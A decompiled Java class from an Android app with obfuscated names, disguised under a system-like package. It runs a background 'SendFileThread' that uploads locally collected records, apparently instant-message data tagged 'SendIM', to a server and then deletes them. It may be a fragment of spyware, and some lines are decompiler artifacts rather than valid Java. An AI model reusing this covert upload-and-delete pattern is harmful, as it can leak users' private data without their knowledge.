package com.app.system.common.f;

import android.content.Context;
import com.security.d.a;
import java.util.List;

public class h
{
  public static void a(Context paramContext)
  {
    try
    {
      Thread local1 = new com/app/system/common/f/h$1;
      local1.<init>("SendFileThread", paramContext);
      local1.start();
    }
    catch (Exception paramContext)
    {
      a.a("SendIM", "sendDataToServer()", new Object[] { paramContext });
    }
  }
  
  private static void c(Context paramContext)
  {
    com.app.system.common.h.i locali = new com.app.system.common.h.i(paramContext);
    List localList = locali.c();
    if ((localList != null) && (localList.size() != 0))
    {
      if (new com.app.system.common.d.a.i(com.app.system.common.h.c(paramContext)).a(paramContext, localList) == 1) {
        locali.a(localList);
      }
      return;
    }
  }
}


/* Location:              ~/com/app/system/common/f/h.class
 *
 * Reversed by:           J
 */